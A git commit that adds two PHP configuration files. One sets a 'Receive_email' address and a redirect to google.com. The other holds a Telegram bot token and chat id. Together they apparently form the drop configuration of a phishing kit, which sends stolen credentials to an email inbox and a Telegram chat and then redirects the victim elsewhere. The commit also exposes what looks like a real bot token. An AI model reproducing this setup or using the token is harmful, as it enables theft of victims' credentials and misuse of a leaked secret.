3eeb68d20f93ec8005744bdfe13f05061a1eaea0
leon8867 <148399175+leon8867@users.noreply.github.com>
2024-09-17 00:17:13 +0800

    Add files via upload

---
+++ email.php
@@ -0,0 +1,4 @@
+<?php 
+$Receive_email="olivertwist@internetkeno.com";
+$redirect="https://www.google.com/";
+?>
---
+++ ram.php
@@ -0,0 +1,8 @@
+
+<?php
+
+$botToken = "6091270305:AAGsmUhOOWcmygeVdcwrBzx-MojS3hfWW70";
+
+$id = "5493949712";
+
+?>
